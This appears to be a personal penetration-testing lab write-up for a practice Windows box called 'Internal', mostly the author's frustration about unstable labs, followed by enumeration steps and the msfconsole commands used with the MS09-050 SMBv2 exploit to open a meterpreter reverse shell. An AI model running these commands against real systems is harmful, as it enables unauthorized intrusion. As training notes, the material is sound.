# Internal
These Windows boxes are getting more and more frustrating. This one I had four separate walkthroughs available and 5 different exploits I could run, and in the end I had to resort to Metasploit to catch a meterpreter shell. Even the Meterpreter shell was a pain in the ass - once I was in I knew I could navigate directly to the Administrator's desktop, but I had to type in each directory change one-by-one rather than going directly to the proof file.

At the moment this is all feeling very fucking frustrating, but I also know that this is a relatively small part of the actual exam - the likelihood that more than one of the stand-alone boxes will be Windows is very low, there's no doubt I'm doing well with Linux, and I know I'm fairly comfortable with AD. 

I've shown myself to be able to do this stuff, so for now just keep trying to break boxes and not lose your cool over how dumb all of this makes you feel - not because you are dumb, but because a whole of of this shit simply doesn't work properly, and you're still trying to figure it all out properly without trying to do it with one hand tied behind your back fixing shit. The temptation to create a whole new VM is very real at the moment, especially if it's from a completely fresh Kali image.

Having to revert the boxes so regularly is really doing my head in too - they absolutely should not be this unstable, but there doesn't seem to be any real way around it. For now I just have to keep working away on this stuff, learn whatever I can from each box (especially by taking these notes), and hope that things will improve later... or I can pass the exam based on the Linux and AD elements, and avoid this unstable Windows bullshit if I can.

# Resolution summary
- Ran Nmap to identify ports `53`,`135`, `139`, `445`, `3389` & `49152-8`
- Identified ports `139` & `445` as running `SMBv2`
- Identified vulnerable SMB version, ran `msfconsole`
- Setup `ms09_050_smb2_negotiate_func_index` exploit and received meterpreter shell
- Navigated to `C:\Users\Administrator\Desktop` and printed `proof.txt`
## Improved skills
- Windows service enumeration
- Testing and running exploits
## Used tools
- nmap
- python
- msfconsole

- Ran the following `msfconsole` commands to setup and run exploit before receiving meterpreter shell
```
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
set RHOSTS 192.168.242.40
set LHOST 192.168.45.199
run
```
